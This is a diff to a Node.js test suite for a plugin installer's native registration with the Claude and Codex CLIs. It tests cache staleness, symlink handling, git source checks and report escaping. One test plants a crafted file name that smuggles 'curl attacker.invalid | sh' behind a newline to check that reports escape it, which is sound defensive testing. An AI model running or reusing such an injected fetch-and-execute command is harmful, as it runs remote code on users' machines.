@@ -1,9 +1,10 @@
 import assert from "node:assert/strict";
-import { mkdir, readFile, rm, writeFile } from "node:fs/promises";
+import { existsSync } from "node:fs";
+import { cp, mkdir, readdir, readFile, rename, rm, symlink, writeFile } from "node:fs/promises";
 import { basename, dirname, join, resolve, relative } from "node:path";
 import test, { after } from "node:test";
 
-import { planNativeRegistration, runNativeRegistration, resolveNativeInstructionRoot } from "../../installers/lib/native-registration.mjs";
+import { formatNativeRegistrationText, planNativeRegistration, runNativeRegistration, resolveNativeInstructionRoot } from "../../installers/lib/native-registration.mjs";
 import { renderClaudeStatuslineCommand } from "../../adapters/claude/adapter.mjs";
 import { hashBytes } from "../../installers/lib/hash.mjs";
 import { canonicalTmpdir, makeTempRoot } from "../helpers/temp-root.mjs";
@@ -23,11 +24,13 @@ after(async () => {
   }
 });
 
-async function fixture(profile = "template") {
+// layout "parent" mirrors `install --surface all`: the Claude package is
+// <root>/package/claude and its state sits one level up with a claude/ prefix.
+async function fixture(profile = "template", { layout = "own" } = {}) {
   const root = await generatedTempRoot("aaa-t06-");
-  const packageRoot = join(root, "package");
+  const packageRoot = layout === "parent" ? join(root, "package", "claude") : join(root, "package");
   const productRoot = join(root, "product");
-  await mkdir(packageRoot);
+  await mkdir(packageRoot, { recursive: true });
   await mkdir(productRoot, { recursive: true });
   await mkdir(join(packageRoot, ".claude-plugin"));
   await mkdir(join(packageRoot, ".codex-plugin"));
@@ -36,6 +39,10 @@ async function fixture(profile = "template") {
   await mkdir(join(packageRoot, "all-about-agents"), { recursive: true });
   await mkdir(join(packageRoot, "agents"), { recursive: true });
   await mkdir(join(packageRoot, "statusline"), { recursive: true });
+  await mkdir(join(packageRoot, "skills", "kept-skill"), { recursive: true });
+  await writeFile(join(packageRoot, "skills", "kept-skill", "SKILL.md"), "# Kept skill\n");
+  await mkdir(join(packageRoot, "hooks"), { recursive: true });
+  await writeFile(join(packageRoot, "hooks", "activity-audit.mjs"), "// hook\n");
   await writeFile(join(packageRoot, ".claude-plugin", "plugin.json"), "{}\n");
   await writeFile(join(packageRoot, ".claude-plugin", "marketplace.json"), "{}\n");
   await writeFile(join(packageRoot, ".codex-plugin", "plugin.json"), "{}\n");
@@ -54,12 +61,17 @@ async function fixture(profile = "template") {
   for (const role of ["architect", "implementer", "investigator", "researcher", "reviewer", "security-reviewer", "verifier"]) {
     await writeFile(join(packageRoot, "agents", `${role}.toml`), `developer_instructions = "${role}"\n`);
   }
+  const prefix = layout === "parent" ? "claude/" : "";
   const ownedPaths = (await treeBytes(packageRoot)).map(([relativePath, content]) => ({
-    relativePath: relativePath.replaceAll("\\", "/"),
+    relativePath: `${prefix}${relativePath.replaceAll("\\", "/")}`,
     sha256: hashBytes(Buffer.from(content, "base64"))
   })).sort((left, right) => left.relativePath === right.relativePath ? 0 : left.relativePath < right.relativePath ? -1 : 1);
-  await mkdir(join(packageRoot, ".all-about-agents"), { recursive: true });
-  await writeFile(join(packageRoot, ".all-about-agents", "state.json"), `${JSON.stringify({
+  // Hooks append runtime logs beside themselves; they are never owned.
+  await mkdir(join(packageRoot, "hooks", "audit"), { recursive: true });
+  await writeFile(join(packageRoot, "hooks", "audit", "activity-audit.log"), "runtime event\n");
+  const stateRoot = layout === "parent" ? dirname(packageRoot) : packageRoot;
+  await mkdir(join(stateRoot, ".all-about-agents"), { recursive: true });
+  await writeFile(join(stateRoot, ".all-about-agents", "state.json"), `${JSON.stringify({
     schemaVersion: 1,
     repositoryVersion: "test-repository",
     profile,
@@ -83,6 +95,37 @@ async function treeBytes(root) {
   return result.sort((left, right) => left[0].localeCompare(right[0]));
 }
 
+const PLUGIN_SELECTOR = "all-about-agents@all-about-agents";
+const CLAUDE_REINSTALL = [
+  `claude plugin uninstall ${PLUGIN_SELECTOR} --scope user --keep-data`,
+  `claude plugin install ${PLUGIN_SELECTOR} --scope user`
+];
+
+function claudeCacheRoot(input) {
+  return join(input.productRoot, "plugins", "cache", "all-about-agents", "all-about-agents", "2.1.1");
+}
+
+// Fake product CLIs. Like the real product, a Claude install copies the package
+// into a version-keyed cache only when that cache does not exist yet.
+function fakeProducts(input, { gitPrefix = "", gitStatus = "", listing } = {}) {
+  const cacheRoot = claudeCacheRoot(input);
+  const calls = [];
+  const run = async (request) => {
+    calls.push(request);
+    const [, command] = request.args;
+    if (request.executable === "git" && request.args.includes("rev-parse")) {
+      return gitPrefix === null ? { exitCode: 128, stdout: "", stderr: "fatal: not a git repository" } : { exitCode: 0, stdout: `${gitPrefix}\n`, stderr: "" };
+    }
+    if (request.executable === "git") return { exitCode: 0, stdout: gitStatus, stderr: "" };
+    if (request.executable === "claude" && command === "install" && !existsSync(cacheRoot)) await cp(input.packageRoot, cacheRoot, { recursive: true });
+    if (request.executable === "claude" && command === "list") {
+      return { exitCode: 0, stdout: JSON.stringify(listing ?? [{ id: PLUGIN_SELECTOR, version: "2.1.1", scope: "user", enabled: true, installPath: cacheRoot }]), stderr: "" };
+    }
+    return { exitCode: 0, stdout: "{}", stderr: "" };
+  };
+  return { run, calls };
+}
+
 function base(input, surface) {
   return planNativeRegistration({
     surface,
@@ -98,8 +141,8 @@ function base(input, surface) {
 test("planner creates deterministic known actions for every surface", async () => {
   const input = await fixture();
   const expected = {
-    claude: ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list", "claude-reload"],
-    codex: ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list", "codex-hooks-trust"]
+    claude: ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list", "claude-plugin-cache-check", "claude-reload"],
+    codex: ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]
   };
   for (const [surface, ids] of Object.entries(expected)) {
     const plan = base(input, surface);
@@ -286,7 +329,7 @@ test("apply stops at the first required process failure and reports a partial re
   assert.equal(report.status, "partial");
   assert.equal(report.completed.length, 11);
   assert.equal(report.failed.action.id, "codex-plugin-install");
-  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-list", "codex-hooks-trust"]);
+  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]);
   assert.deepEqual(calls[0].args, ["plugin", "marketplace", "add", input.packageRoot, "--json"]);
   assert.deepEqual(calls[0].environmentKeys, ["CODEX_HOME"]);
   assert.equal(calls[0].env, undefined);
@@ -297,10 +340,7 @@ test("apply stops at the first required process failure and reports a partial re
 
 test("successful native commands remain registered not-run until semantic discovery is observed", async () => {
   const input = await fixture();
-  const report = await runNativeRegistration(base(input, "codex"), {
-    mode: "apply",
-    runProcess: async () => ({ exitCode: 0, stdout: "{}", stderr: "" })
-  });
+  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
   assert.equal(report.status, "complete");
   assert.equal(report.lifecycle.validated.status, "not-run");
   assert.equal(report.lifecycle.registered.status, "not-run");
@@ -310,14 +350,11 @@ test("successful native commands remain registered not-run until semantic discov
 test("successful reports keep manual actions out of completed execution", async () => {
   const input = await fixture();
   const cases = [
-    ["codex", ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list"]],
-    ["claude", ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list"]]
+    ["codex", ["codex-instructions-deploy", "codex-config-deploy", "codex-terra-profile-deploy", "codex-agent-architect-deploy", "codex-agent-implementer-deploy", "codex-agent-investigator-deploy", "codex-agent-researcher-deploy", "codex-agent-reviewer-deploy", "codex-agent-security-reviewer-deploy", "codex-agent-verifier-deploy", "codex-marketplace-add", "codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check"]],
+    ["claude", ["claude-instructions-deploy", "claude-settings-deploy", "claude-statusline-config-deploy", "claude-statusline-renderer-deploy", "claude-statusline-tracker-deploy", "claude-statusline-windows-launcher-deploy", "claude-statusline-posix-launcher-deploy", "claude-marketplace-add", "claude-plugin-install", "claude-plugin-list", "claude-plugin-cache-check"]]
   ];
   for (const [surface, executedIds] of cases) {
-    const report = await runNativeRegistration(base(input, surface), {
-      mode: "apply",
-      runProcess: async () => ({ exitCode: 0, stdout: "{}", stderr: "" })
-    });
+    const report = await runNativeRegistration(base(input, surface), { mode: "apply", runProcess: fakeProducts(input).run });
     assert.equal(report.status, "complete");
     assert.deepEqual(report.completed.map((action) => action.id), executedIds);
     assert.equal(report.actions.at(-1).status, "manual-required");
@@ -438,11 +475,12 @@ test("native execution keeps ambient secrets out of requests and reports", async
   process.env[key] = secret;
   try {
     const requests = [];
+    const products = fakeProducts(input);
     const report = await runNativeRegistration(base(input, "claude"), {
       mode: "apply",
       runProcess: async (request) => {
         requests.push(request);
-        return { exitCode: 0, stdout: "{}", stderr: secret };
+        return { ...(await products.run(request)), stderr: secret };
       }
     });
     assert.equal(report.status, "complete");
@@ -491,17 +529,14 @@ test("apply stops on a timed-out native process and does not run later actions",
   assert.equal(report.status, "partial");
   assert.equal(report.failed.error.code, "native-process-timeout");
   assert.equal(calls.length, 1);
-  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-install", "codex-plugin-list", "codex-hooks-trust"]);
+  assert.deepEqual(report.notAttempted.map((action) => action.id), ["codex-plugin-install", "codex-plugin-list", "codex-plugin-source-check", "codex-hooks-trust"]);
 });
 
 test("apply atomically overwrites approved Claude and Codex config destinations", async () => {
   const input = await fixture();
   await writeFile(join(input.productRoot, "CLAUDE.md"), "old instructions\n");
   await writeFile(join(input.productRoot, "settings.json"), '{"old":true}\n');
-  const claude = await runNativeRegistration(base(input, "claude"), {
-    mode: "apply",
-    runProcess: async () => ({ exitCode: 0, stdout: "{}", stderr: "" })
-  });
+  const claude = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
   assert.equal(claude.status, "complete");
   assert.equal(await readFile(join(input.productRoot, "CLAUDE.md"), "utf8"), "# Global instructions\n");
   const productEntries = await (await import("node:fs/promises")).readdir(input.productRoot);
@@ -516,12 +551,275 @@ test("apply atomically overwrites approved Claude and Codex config destinations"
   assert.equal(await readFile(join(input.productRoot, "statusline", "statusline.ps1"), "utf8"), "# windows launcher\n");
   assert.equal(await readFile(join(input.productRoot, "statusline", "statusline.sh"), "utf8"), "#!/bin/sh\n# posix launcher\n");
 
-  const codex = await runNativeRegistration(base(input, "codex"), {
-    mode: "apply",
-    runProcess: async () => ({ exitCode: 0, stdout: "{}", stderr: "" })
-  });
+  const codex = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
   assert.equal(codex.status, "complete");
   assert.equal(await readFile(join(input.productRoot, "config.toml"), "utf8"), 'model = "gpt-5.6-sol"\n');
   assert.equal(await readFile(join(input.productRoot, "terra-max.config.toml"), "utf8"), 'model = "gpt-5.6-terra"\n');
   assert.equal(await readFile(join(input.productRoot, "agents", "reviewer.toml"), "utf8"), 'developer_instructions = "reviewer"\n');
+});
+
+test("Claude registration reports manual-required while the plugin cache still holds an older copy", async () => {
+  const input = await fixture();
+  const cacheRoot = claudeCacheRoot(input);
+  await cp(input.packageRoot, cacheRoot, { recursive: true });
+  await mkdir(join(cacheRoot, "skills", "removed-skill"), { recursive: true });
+  await writeFile(join(cacheRoot, "skills", "removed-skill", "SKILL.md"), "# Removed from the package\n");
+
+  const stale = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
+  assert.equal(stale.status, "manual-required");
+  const check = stale.actions.find((action) => action.id === "claude-plugin-cache-check");
+  assert.equal(check.status, "manual-required");
+  assert.match(check.reason, /skills\/removed-skill\/SKILL\.md/u);
+  assert.deepEqual(check.commands, CLAUDE_REINSTALL);
+  assert.equal(stale.completed.some((action) => action.id === "claude-plugin-cache-check"), false);
+  assert.equal(stale.error.code, "installed-copy-not-confirmed");
+  assert.equal(stale.lifecycle.registered.status, "fail");
+  assert.equal(stale.actions.at(-1).id, "claude-reload");
+  assert.equal(JSON.stringify(stale).includes(input.productRoot), false);
+  const text = formatNativeRegistrationText(stale);
+  for (const command of CLAUDE_REINSTALL) assert.ok(text.includes(command), `text report omits ${command}`);
+
+  await rm(cacheRoot, { recursive: true });
+  const refreshed = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
+  assert.equal(refreshed.status, "complete");
+  assert.equal(refreshed.actions.find((action) => action.id === "claude-plugin-cache-check").status, "complete");
+});
+
+test("Claude registration fails closed when the product output does not locate a comparable cache", async () => {
+  const input = await fixture();
+  const outside = await generatedTempRoot("aaa-t06-foreign-cache-");
+  const cases = [
+    [[], /no user-scope entry/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "project", enabled: true, installPath: claudeCacheRoot(input) }], /no user-scope entry/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true }], /has no installPath/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: outside }], /outside the plugin cache/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: input.productRoot }], /outside the plugin cache/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: join(input.productRoot, "plugins") }], /outside the plugin cache/u],
+    [[{ id: PLUGIN_SELECTOR, scope: "user", enabled: true, installPath: join(input.productRoot, "plugins", "cache", "missing") }], /does not exist/u]
+  ];
+  for (const [listing, reason] of cases) {
+    const report = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input, { listing }).run });
+    assert.equal(report.status, "manual-required");
+    const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
+    assert.equal(check.status, "manual-required");
+    assert.match(check.reason, reason);
+    assert.deepEqual(check.commands, CLAUDE_REINSTALL);
+  }
+});
+
+test("Claude cache check allows only known runtime files and flags every other difference", async () => {
+  const input = await fixture();
+  const cacheRoot = claudeCacheRoot(input);
+  await cp(input.packageRoot, cacheRoot, { recursive: true });
+  await writeFile(join(cacheRoot, "hooks", "audit", "activity-audit.log"), "cache-only runtime event\n", { flag: "a" });
+  await mkdir(join(cacheRoot, "hooks", "checkpoints"), { recursive: true });
+  await writeFile(join(cacheRoot, "hooks", "checkpoints", "checkpoint.jsonl"), "{}\n");
+  await mkdir(join(cacheRoot, ".in_use"), { recursive: true });
+  await writeFile(join(cacheRoot, ".in_use", "session-marker"), "");
+  const register = async () => runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
+  const cacheCheck = (report) => report.actions.find((action) => action.id === "claude-plugin-cache-check");
+
+  const clean = await register();
+  assert.equal(clean.status, "complete");
+
+  await writeFile(join(cacheRoot, "hooks", "activity-audit.mjs"), "// older hook\n");
+  const changed = await register();
+  assert.equal(changed.status, "manual-required");
+  assert.match(cacheCheck(changed).reason, /hooks\/activity-audit\.mjs/u);
+  await writeFile(join(cacheRoot, "hooks", "activity-audit.mjs"), "// hook\n");
+
+  await rm(join(cacheRoot, ".claude-plugin", "marketplace.json"));
+  const missing = await register();
+  assert.equal(missing.status, "manual-required");
+  assert.match(cacheCheck(missing).reason, /\.claude-plugin\/marketplace\.json/u);
+  await writeFile(join(cacheRoot, ".claude-plugin", "marketplace.json"), "{}\n");
+
+  for (const stalePath of ["skills/removed-skill/SKILL.md", "agents/removed-agent.md", "rules/removed-rule.md", "commands/old.md", ".mcp.json", "hooks/old-hook.mjs"]) {
+    const target = join(cacheRoot, ...stalePath.split("/"));
+    await mkdir(dirname(target), { recursive: true });
+    await writeFile(target, "stale\n");
+    const extra = await register();
+    assert.equal(extra.status, "manual-required", stalePath);
+    assert.ok(cacheCheck(extra).reason.includes(stalePath), stalePath);
+    await rm(target);
+  }
+});
+
+test("Claude cache check does not follow a symlinked folder inside the cache", async () => {
+  const input = await fixture();
+  const cacheRoot = claudeCacheRoot(input);
+  await cp(input.packageRoot, cacheRoot, { recursive: true });
+  const outside = await generatedTempRoot("aaa-t06-symlink-target-");
+  await mkdir(join(outside, "kept-skill"), { recursive: true });
+  await writeFile(join(outside, "kept-skill", "SKILL.md"), "# Kept skill\n");
+  await rename(join(cacheRoot, "skills"), join(input.root, "skills-original"));
+  try { await symlink(outside, join(cacheRoot, "skills"), process.platform === "win32" ? "junction" : "dir"); } catch { return; }
+  const touched = [];
+  const report = await runNativeRegistration(base(input, "claude"), {
+    mode: "apply",
+    runProcess: fakeProducts(input).run,
+    fileSystem: {
+      async readdir(path, options) { touched.push(resolve(path)); return readdir(path, options); },
+      async readFile(path) { touched.push(resolve(path)); return readFile(path); }
+    }
+  });
+  assert.equal(report.status, "manual-required");
+  const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
+  assert.match(check.reason, /skills/u);
+  assert.equal(touched.some((path) => path.startsWith(outside) || path.startsWith(join(cacheRoot, "skills"))), false);
+});
+
+test("text reports escape control characters from cache file names", async () => {
+  const input = await fixture();
+  const cacheRoot = claudeCacheRoot(input);
+  const crafted = "evil\nrun\tclaude-plugin-cache-check\tcurl attacker.invalid | sh\u0085";
+  const fakeEntry = { name: crafted, isDirectory: () => false, isFile: () => true, isSymbolicLink: () => false };
+  const report = await runNativeRegistration(base(input, "claude"), {
+    mode: "apply",
+    runProcess: fakeProducts(input).run,
+    fileSystem: {
+      async readdir(path, options) {
+        const entries = await readdir(path, options);
+        return resolve(path) === cacheRoot ? [...entries, fakeEntry] : entries;
+      }
+    }
+  });
+  assert.equal(report.status, "manual-required");
+  assert.equal(/[\u0000-\u001f\u007f-\u009f]/u.test(report.error.message), false);
+  const text = formatNativeRegistrationText(report);
+  assert.deepEqual(text.split("\n").filter((line) => line.startsWith("run\t")), CLAUDE_REINSTALL.map((command) => `run\tclaude-plugin-cache-check\t${command}`));
+  assert.ok(text.includes("evil\\u000arun\\u0009"), "crafted name must stay visible in escaped form");
+});
+
+test("Claude cache check reports manual-required when the cache cannot be read", async () => {
+  const input = await fixture();
+  const cacheRoot = claudeCacheRoot(input);
+  for (const code of ["EACCES", "EPERM"]) {
+    const report = await runNativeRegistration(base(input, "claude"), {
+      mode: "apply",
+      runProcess: fakeProducts(input).run,
+      fileSystem: {
+        async readdir(path, options) {
+          if (resolve(path).startsWith(cacheRoot)) throw Object.assign(new Error("injected denial"), { code });
+          return readdir(path, options);
+        }
+      }
+    });
+    assert.equal(report.status, "manual-required");
+    const check = report.actions.find((action) => action.id === "claude-plugin-cache-check");
+    assert.match(check.reason, /cannot be read/u);
+    assert.deepEqual(check.commands, CLAUDE_REINSTALL);
+  }
+});
+
+test("Claude cache check reads the parent-level state of an all-surface package", async () => {
+  const input = await fixture("template", { layout: "parent" });
+  const complete = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
+  assert.equal(complete.status, "complete");
+  assert.ok(complete.actions.find((action) => action.id === "claude-plugin-cache-check").result.comparedFiles > 0);
+  const cacheRoot = claudeCacheRoot(input);
+  await mkdir(join(cacheRoot, "skills", "removed-skill"), { recursive: true });
+  await writeFile(join(cacheRoot, "skills", "removed-skill", "SKILL.md"), "# Removed\n");
+  const stale = await runNativeRegistration(base(input, "claude"), { mode: "apply", runProcess: fakeProducts(input).run });
+  assert.equal(stale.status, "manual-required");
+  assert.match(stale.actions.find((action) => action.id === "claude-plugin-cache-check").reason, /skills\/removed-skill\/SKILL\.md/u);
+});
+
+test("Codex registration reports manual-required while the package tree differs from its Git HEAD", async () => {
+  const input = await fixture();
+  const previous = { GIT_DIR: process.env.GIT_DIR, GIT_INDEX_FILE: process.env.GIT_INDEX_FILE };
+  process.env.GIT_DIR = join(input.root, "elsewhere.git");
+  process.env.GIT_INDEX_FILE = join(input.root, "elsewhere.index");
+  try {
+    const dirty = fakeProducts(input, { gitStatus: "?? skills/new-skill/SKILL.md\n" });
+    const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: dirty.run });
+    assert.equal(report.status, "manual-required");
+    const gitCalls = dirty.calls.filter((request) => request.executable === "git");
+    assert.deepEqual(gitCalls.map((request) => request.args), [
+      ["-c", "core.fsmonitor=false", "rev-parse", "--show-prefix"],
+      ["-c", "core.fsmonitor=false", "--no-optional-locks", "status", "--porcelain", "--untracked-files=all", "--", "."]
+    ]);
+    for (const request of gitCalls) {
+      assert.equal(request.cwd, input.packageRoot);
+      assert.equal(request.shell, false);
+      assert.equal(request.envOverrides, undefined);
+      assert.deepEqual(Object.keys(request.env).filter((key) => /^GIT_/iu.test(key)), []);
+    }
+    const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
+    assert.equal(check.status, "manual-required");
+    assert.match(check.reason, /Git clone of the package root/u);
+    assert.deepEqual(check.commands, [
+      "git -C '<PACKAGE_ROOT>' status --short",
+      "git -C '<PACKAGE_ROOT>' add -A",
+      "git -C '<PACKAGE_ROOT>' -c user.name=all-about-agents -c user.email=all-about-agents@invalid.example commit -m \"Update local Codex plugin source\"",
+      `codex plugin remove ${PLUGIN_SELECTOR} --json`,
+      `codex plugin add ${PLUGIN_SELECTOR} --json`
+    ]);
+    assert.equal(JSON.stringify(report).includes("elsewhere"), false);
+    assert.equal(report.actions.at(-1).id, "codex-hooks-trust");
+
+    const clean = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input).run });
+    assert.equal(clean.status, "complete");
+  } finally {
+    for (const [key, value] of Object.entries(previous)) {
+      if (value === undefined) delete process.env[key];
+      else process.env[key] = value;
+    }
+  }
+});
+
+test("Codex registration requires the package root to be its own Git repository", async () => {
+  const input = await fixture();
+  for (const gitPrefix of ["codex/", null]) {
+    const products = fakeProducts(input, { gitPrefix, gitStatus: "" });
+    const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: products.run });
+    assert.equal(report.status, "manual-required");
+    const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
+    assert.match(check.reason, /the package root must be its own Git repository/u);
+    assert.match(check.reason, /native-registration\.md/u);
+    assert.deepEqual(check.commands, []);
+    assert.equal(products.calls.some((request) => request.args.includes("status")), false);
+  }
+
+  const noGit = await runNativeRegistration(base(input, "codex"), {
+    mode: "apply",
+    runProcess: async (request) => request.executable === "git" ? { unavailable: true, exitCode: null, stdout: "", stderr: "" } : { exitCode: 0, stdout: "{}", stderr: "" }
+  });
+  assert.equal(noGit.status, "manual-required");
+  assert.match(noGit.actions.find((action) => action.id === "codex-plugin-source-check").reason, /git is unavailable/u);
+});
+
+test("an unverifiable installed copy uses the same not-confirmed error code as a stale one", async () => {
+  const input = await fixture();
+  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input, { gitPrefix: null }).run });
+  assert.equal(report.error.code, "installed-copy-not-confirmed");
+  assert.match(report.error.message, /own Git repository/u);
+});
+
+test("Codex registration prints no quoted git commands for a package root that contains an apostrophe", async () => {
+  const input = await fixture();
+  const quotedRoot = join(input.root, "owner's package");
+  await rename(input.packageRoot, quotedRoot);
+  input.packageRoot = quotedRoot;
+  const report = await runNativeRegistration(base(input, "codex"), { mode: "apply", runProcess: fakeProducts(input, { gitStatus: " M skills/kept-skill/SKILL.md\n" }).run });
+  assert.equal(report.status, "manual-required");
+  const check = report.actions.find((action) => action.id === "codex-plugin-source-check");
+  assert.match(check.reason, /working tree differs from its HEAD commit/u);
+  assert.match(check.reason, /native-registration\.md, section Codex CLI/u);
+  assert.deepEqual(check.commands, []);
+  assert.equal(formatNativeRegistrationText(report).includes("git -C"), false);
+});
+
+test("failed registration reports escape control characters from a caught error message", async () => {
+  const input = await fixture();
+  const report = await runNativeRegistration(base(input, "claude"), {
+    mode: "apply",
+    runProcess: async () => { throw new Error("scandir failed\n run x\tforged"); }
+  });
+  assert.notEqual(report.status, "complete");
+  const controlCharacter = /[\u0000-\u001f\u007f-\u009f]/u;
+  for (const message of [report.error.message, report.failed.reason, report.failed.action.reason]) {
+    assert.equal(controlCharacter.test(message), false, message);
+    assert.ok(message.includes("scandir failed\\u000a run x\\u0009forged"), message);
+  }
 });
